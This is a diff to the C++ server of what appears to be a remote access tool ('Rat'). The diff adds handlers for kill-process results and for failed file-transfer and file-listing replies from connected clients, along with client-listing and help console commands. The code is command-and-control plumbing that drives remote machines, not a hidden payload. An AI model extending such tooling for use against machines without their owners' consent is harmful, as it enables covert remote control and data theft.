@@ -105,17 +105,22 @@ namespace Rat
                             {
                                 std::cout << "Handshake error: " << ec.message() << "\n";
                             }
-                            boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
-                            // acceptConnections();
+                            //boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
+                             //acceptConnections();
                         });
                 } 
                 else 
                 {
                     std::cout << "Accept error: " << ec.message() << "\n";
-                    boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
-                    // acceptConnections();
+                    //boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
+                    //acceptConnections();
                 }
+                acceptConnections();
+
+
             });
+
+            
     }
 
     
@@ -146,7 +151,7 @@ namespace Rat
                         file_receivers_.erase(client_id); 
                         
                     }
-                    std::cout << "reset GUI: " << std::endl;
+                    // std::cout << "reset GUI: " << std::endl;
                     ServerGUI::resetHeaderDisplayed();
                     return;
                 }
@@ -180,6 +185,7 @@ namespace Rat
                             // std::cout << "TRANSFER FILE PAYLOAD FROM SERVER: " << packet.chunked_data().sequence_number() + 1 << " / "
                             //         << packet.chunked_data().total_chunks() << " = "
                             //         << (packet.chunked_data().sequence_number() + 1) / float(packet.chunked_data().total_chunks()) * 100 << "%" << std::endl;
+                            
                             uint64_t client_id;
                             std::string ip_id;
                             {
@@ -192,6 +198,12 @@ namespace Rat
                                 }
                                 client_id = client_it->second;
                                 ip_id = client->lowest_layer().remote_endpoint().address().to_string();
+                            }
+                            if(packet.chunked_data().success() == false)
+                            {
+                                ServerGUI::displayResult(client_id, ip_id, "TRANSFER FILE", packet.chunked_data().payload());
+                                boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
+                                return;
                             }
                             auto receiver_it = file_receivers_.find(client_id);
                             if (receiver_it == file_receivers_.end()) 
@@ -245,7 +257,12 @@ namespace Rat
                                 ip_id = client->lowest_layer().remote_endpoint().address().to_string();
                                 client_copy = client;
                             }
-
+                            if(packet.chunked_data().success() == false)
+                            {
+                                ServerGUI::displayResult(client_id, ip_id, "LIST FILES FOLDERS", packet.chunked_data().payload());
+                                boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
+                                return;
+                            }
                           
                             {
                                 std::lock_guard<std::mutex> lock(process_handlers_mutex_);
@@ -345,6 +362,26 @@ namespace Rat
                             return; // ProcessHandler will automatically call handleClient when done
                             break;
                         }
+                        case rat::Packet::KILL_PROCESS:
+                        {
+                            uint64_t client_id;
+                            std::string ip_id;
+                            // std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client_copy;
+                            {
+                                std::lock_guard<std::mutex> lock(client_mutex_);
+                                auto client_it = clients_.find(client);
+                                if (client_it == clients_.end())
+                                {
+                                    std::cerr << "[" << std::time(nullptr) << "] Unknown client sending LIST_PROCESSES\n";
+                                    break;
+                                }
+                                client_id = client_it->second;
+                                ip_id = client->lowest_layer().remote_endpoint().address().to_string();
+                                // client_copy = client; 
+                            }
+                            ServerGUI::displayResult(client_id, ip_id, "KILL PROCESS", packet.chunked_data().payload());
+                            break;
+                        }
                         default:
                         {
                             boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
@@ -375,6 +412,10 @@ namespace Rat
             //     stop();
             //     break;
             // }
+            if(input == "") 
+            {
+                
+            }
             std::vector<std::string> list_commands = Utils::handleCommand(input);
             if(list_commands.size() == 3)
             {
@@ -403,6 +444,24 @@ namespace Rat
                     chunked->set_total_chunks(1);
                     chunked->set_payload(command);
                     chunked->set_success(true);
+                    // for(auto& client_send: clients_)
+                    // {
+                    //     object_id = client_send.second;
+                    //     rat::Packet packet_transfer_file;
+                    //     packet_transfer_file.set_type(rat::Packet::TRANSFER_FILE);
+                    //     packet_transfer_file.set_packet_id("client_" + std::to_string(object_id) + "_" + Utils::getCurrentTimeString());
+                    //     packet_transfer_file.set_source_id("server_0");
+                    //     packet_transfer_file.set_destination_id("client_" + std::to_string(object_id));
+                    //     packet_transfer_file.set_encrypted(true);
+                    //     packet_transfer_file.set_file_path(argument);
+                    //     auto* chunked = packet_transfer_file.mutable_chunked_data();
+                    //     chunked->set_data_id("TRANSFER_FILE" + Utils::getCurrentTimeString() + std::to_string(object_id));
+                    //     chunked->set_sequence_number(0);
+                    //     chunked->set_total_chunks(1);
+                    //     chunked->set_payload(command);
+                    //     chunked->set_success(true);
+                    //     sendCommandToClient(client_send.first, packet_transfer_file);
+                    // }
                     // std::cout << "debug packet transfer: " << packet_transfer_file.file_path() << std::endl;
                     networkManager_.send(socket_client, packet_transfer_file, [](const boost::system::error_code& ec) 
                     {
@@ -483,6 +542,14 @@ namespace Rat
                         // sendCommandToClient(client.first, packet);
                     }
                 }
+                else if (command == "list_clients")
+                {
+                    ServerGUI::displayClients(clients_);
+                }
+                else if(command == "help")
+                {
+                    ServerGUI::displayMenu();
+                }
                 else 
                 {
                     ServerGUI::displayMenu();
@@ -524,7 +591,8 @@ namespace Rat
             }
             else 
             {
-                ServerGUI::displayMenu();
+                std::cout << "PLEASE ENTERN COMMAND!!!\n";
+                // ServerGUI::displayMenu();
             }
         }
     }
@@ -602,11 +670,11 @@ namespace Rat
             std::lock_guard<std::mutex> lock(client_mutex_);
             // std::cout << "Debug: " << source_id << std::endl;
             // std::cout << "Debug set clients before insert: ";
-            for(auto x: clients_) { std::cout << x.first << "-" << x.second << std::endl;}
+            // for(auto x: clients_) { std::cout << x.first << "-" << x.second << std::endl;}
             // clients_.insert({client, source_id});
             clients_[client] = source_id;
             // std::cout << "Debug set clients after insert: ";
-            for(auto x: clients_) {std::cout << x.first << "-" << x.second << std::endl;}
+            // for(auto x: clients_) {std::cout << x.first << "-" << x.second << std::endl;}
         }
     }
 
